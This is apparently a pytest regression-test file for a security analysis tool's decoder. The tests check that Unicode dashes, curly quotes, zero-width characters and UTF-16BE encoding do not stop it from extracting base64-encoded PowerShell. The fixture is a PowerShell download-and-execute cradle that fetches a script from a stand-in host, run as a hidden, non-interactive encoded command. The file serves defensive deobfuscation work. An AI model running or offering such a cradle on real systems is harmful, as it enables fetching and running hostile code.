"""Regression tests for typographic Unicode punctuation handling and UTF-16BE
auto-detection.

Real-world context: analysts paste PowerShell command lines from phishing
emails / Word documents / PDFs — those sources silently rewrite ASCII `-`
as en-dash (`\\u2013`), em-dash (`\\u2014`), or NBSP. Without normalization
every flag-based extractor misses the payload.
"""
from __future__ import annotations

import base64
import pytest

import cyberlab.plugins  # noqa: F401 — registers plugins
from cyberlab.engine import auto_decode, _normalize_input


PAYLOAD = "IEX (New-Object Net.WebClient).DownloadString('http://x.tld/a.ps1')"
B64_LE = base64.b64encode(PAYLOAD.encode("utf-16le")).decode()
B64_BE = base64.b64encode(PAYLOAD.encode("utf-16be")).decode()


# ---------------------------------------------------------------------------
# Unicode dashes → ASCII normalization
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("dash", [
    "\u2010",  # HYPHEN
    "\u2011",  # NON-BREAKING HYPHEN
    "\u2012",  # FIGURE DASH
    "\u2013",  # EN DASH  (Word/PDF auto-formatted)
    "\u2014",  # EM DASH
    "\u2015",  # HORIZONTAL BAR
    "\u2212",  # MINUS SIGN
    "\uFF0D",  # FULLWIDTH HYPHEN-MINUS
])
def test_powershell_with_unicode_dashes(dash):
    """`powershell.exe –enc <b64>` (with any Unicode dash) must decode
    exactly the same as with an ASCII hyphen."""
    payload = f"powershell.exe {dash}nop {dash}w hidden {dash}NonI {dash}enc {B64_LE}"
    out, trace = auto_decode(payload, max_depth=6)
    text = out.decode("utf-8", errors="replace")
    step_ids = [s.id for s in trace]
    assert "extract-powershell-encoded" in step_ids, (
        f"dash={dash!r} failed to trigger extractor. trace={step_ids}"
    )
    assert "DownloadString" in text, f"final={text[:200]!r}"


def test_powershell_with_smart_quotes_around_b64():
    """`powershell -enc “<b64>”` (curly quotes) still extracts the payload."""
    payload = f"powershell -enc \u201c{B64_LE}\u201d"
    out, trace = auto_decode(payload, max_depth=6)
    step_ids = [s.id for s in trace]
    assert "extract-powershell-encoded" in step_ids
    assert "DownloadString" in out.decode("utf-8", errors="replace")


def test_powershell_with_nbsp_and_zero_width_chars():
    """Non-breaking spaces + zero-width joiners must be folded away."""
    # \u00a0 = NBSP, \u200b = zero-width space
    payload = f"powershell.exe\u00a0-enc\u200b {B64_LE}"
    out, trace = auto_decode(payload, max_depth=6)
    step_ids = [s.id for s in trace]
    assert "extract-powershell-encoded" in step_ids
    assert "DownloadString" in out.decode("utf-8", errors="replace")


def test_normalize_strips_zero_width_and_folds_dashes():
    """Sanity check on `_normalize_input` primitive."""
    src = "\u2013foo\u2014bar\u200bbaz\u00a0qux\u201c\u201d"
    assert _normalize_input(src) == "-foo-barbaz qux\"\""


# ---------------------------------------------------------------------------
# UTF-16 Big Endian auto-detect
# ---------------------------------------------------------------------------
def test_powershell_utf16be_payload_auto_decodes():
    """PS payloads encoded UTF-16BE (some cross-platform pwsh output, not the
    default but seen in the wild) must auto-chain through utf16be-decode."""
    payload = f"powershell -enc {B64_BE}"
    out, trace = auto_decode(payload, max_depth=6)
    step_ids = [s.id for s in trace]
    assert "extract-powershell-encoded" in step_ids
    assert "base64-decode" in step_ids
    assert "utf16be-decode" in step_ids, f"trace={step_ids}"
    assert "DownloadString" in out.decode("utf-8", errors="replace")


def test_no_regression_utf16le_still_wins_over_be():
    """Ensure the LE detector still fires for LE payloads (they must not be
    misidentified as BE)."""
    payload = f"powershell -enc {B64_LE}"
    out, trace = auto_decode(payload, max_depth=6)
    step_ids = [s.id for s in trace]
    assert "utf16le-decode" in step_ids
    assert "utf16be-decode" not in step_ids
    assert "DownloadString" in out.decode("utf-8", errors="replace")
